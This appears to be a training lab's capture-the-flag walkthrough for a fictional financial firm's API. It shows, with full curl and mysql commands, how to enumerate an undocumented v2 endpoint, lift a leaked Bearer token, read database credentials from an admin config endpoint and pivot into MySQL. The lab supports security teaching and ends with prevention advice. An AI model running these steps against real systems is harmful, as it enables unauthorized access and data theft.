# Lab 2.4: API Enumeration Gauntlet

## Learning Objectives
- Understand API versioning and how undocumented versions can expose sensitive data
- Enumerate API endpoints beyond what is listed in public documentation
- Extract authentication tokens from improperly secured user listings
- Use discovered tokens to access restricted administrative endpoints
- Pivot from leaked database credentials to a backend MySQL server
- Capture the flag

## What is API Version Enumeration?

Modern APIs use versioned paths (e.g., `/api/v1/`, `/api/v2/`) to manage breaking changes and feature rollouts. A common misconfiguration occurs when newer API versions are deployed without the same authentication controls as production versions. Attackers who discover these undocumented endpoints can bypass access controls entirely.

### Common API Enumeration Vectors

1. **Version Incrementing**: Testing `/api/v2/`, `/api/v3/` when only `/api/v1/` is documented
2. **Endpoint Guessing**: Trying common paths like `/admin`, `/config`, `/debug`, `/internal`
3. **Token Leakage**: Discovering API keys or tokens in user profiles or error responses
4. **Configuration Exposure**: Administrative endpoints that reveal database credentials or secrets

## Solution Walkthrough

### Step 1: Explore the Documented API

Visit the application root to review the public API documentation.

**Detailed Steps:**

1. **Access the main page:**
   ```bash
   curl -s http://<target_ip>/
   ```

2. **What you should see:**
   - A corporate landing page for Stonebridge Capital
   - API v1 endpoints listed: `/api/v1/users`, `/api/v1/portfolios`, `/api/v1/transactions`
   - All v1 endpoints require an API key

3. **Confirm v1 is locked down:**
   ```bash
   curl -s http://<target_ip>/api/v1/users
   ```

   **Expected result:** `401 Unauthorized` with message "API key required"

### Step 2: Discover the v2 API

Since v1 is locked, try incrementing the version number to look for undocumented endpoints.

**Detailed Steps:**

1. **Try the v2 users endpoint:**
   ```bash
   curl -s http://<target_ip>/api/v2/users
   ```

2. **What you should see:**
   - A JSON response with `api_version: "v2-dev"`
   - An array of user objects
   - One user (the service account) has an `auth_token` field

3. **Extract the token:**
   ```bash
   curl -s http://<target_ip>/api/v2/users | python3 -m json.tool
   ```

   Look for the `svc_internal` user; their `auth_token` field contains a Bearer token.

### Step 3: Access the Admin Config

Use the discovered token to authenticate to the admin configuration endpoint.

**Detailed Steps:**

1. **Try accessing admin config without a token (should fail):**
   ```bash
   curl -s http://<target_ip>/api/v2/admin/config
   ```

   **Expected result:** `403 Forbidden`

2. **Use the Bearer token:**
   ```bash
   curl -s -H "Authorization: Bearer SB_tk_4p1_v3rs10n" http://<target_ip>/api/v2/admin/config
   ```

3. **What you should see:**
   - Database connection details including host, username, and password
   - Feature flags showing that authentication and rate limiting are disabled

### Step 4: Connect to the Database

Use the leaked credentials to connect to the MySQL database server on the subnet.

**Detailed Steps:**

1. **Scan for the database server** (or use the hostname hint from the config):
   ```bash
   mysql -h <db_ip> -u sb_app -p'St0n3br1dg3_DB#' stonebridge -e "SELECT * FROM audit_flags"
   ```

2. **What you should see:**
   - A table with an `assessment_marker` row containing the second part of the flag

### Step 5: Assemble the Flag

Combine the two parts discovered during the assessment:
- Part 1 comes from the token name pattern found in the v2 user listing
- Part 2 comes from the database audit_flags table

The assembled flag follows the `OCR{...}` format.

## Troubleshooting

### v2 Endpoint Returns 404

**Possible causes:**
- Typo in the URL path
- Missing trailing components

**Solutions:**
- Ensure the path is exactly `/api/v2/users`
- Check for case sensitivity

### Admin Config Returns 403

**Possible causes:**
- Missing or malformed Authorization header
- Incorrect token value

**Solutions:**
- Ensure the header format is `Authorization: Bearer <token>` (with a space after Bearer)
- Copy the token exactly as shown in the user listing

### Cannot Connect to MySQL

**Possible causes:**
- Wrong database server IP
- Incorrect credentials
- MySQL client not installed

**Solutions:**
- Scan the subnet for port 3306 if the hostname does not resolve
- Double-check the credentials from the admin config response
- Install the MySQL client: `apt install default-mysql-client`

## Success Criteria

- Confirmed v1 API returns 401 Unauthorized
- Discovered undocumented v2 API endpoints
- Extracted authentication token from user profile
- Accessed admin config using Bearer token authentication
- Retrieved database credentials from admin config
- Connected to MySQL and queried the audit_flags table
- Assembled and submitted the complete flag

## Key Takeaways

### What You Learned

1. **API Version Enumeration**: How incrementing version numbers can reveal unprotected endpoints
2. **Token Leakage**: Service account tokens exposed in user listings
3. **Configuration Exposure**: Admin endpoints that leak database credentials
4. **Lateral Movement**: Pivoting from a web API to a backend database

### Real-World Implications

- **Data Breach**: Unauthenticated API endpoints can expose customer and financial data
- **Credential Leakage**: Tokens and passwords in API responses enable further compromise
- **Regulatory Violations**: Financial firms face SEC and SOC 2 penalties for API misconfigurations
- **Supply Chain Risk**: Partner-facing APIs that leak internal infrastructure details

### Prevention

1. **Enforce authentication on all API versions**, including development previews
2. **Never expose tokens or credentials** in user-facing API responses
3. **Restrict admin/config endpoints** to internal networks only
4. **Use API gateways** to control which versions are publicly accessible
5. **Automated security scanning** of all API routes before deployment

## Further Reading

- OWASP API Security Top 10
- OWASP: Broken Object Level Authorization
- API Security Best Practices
- REST API Versioning Strategies
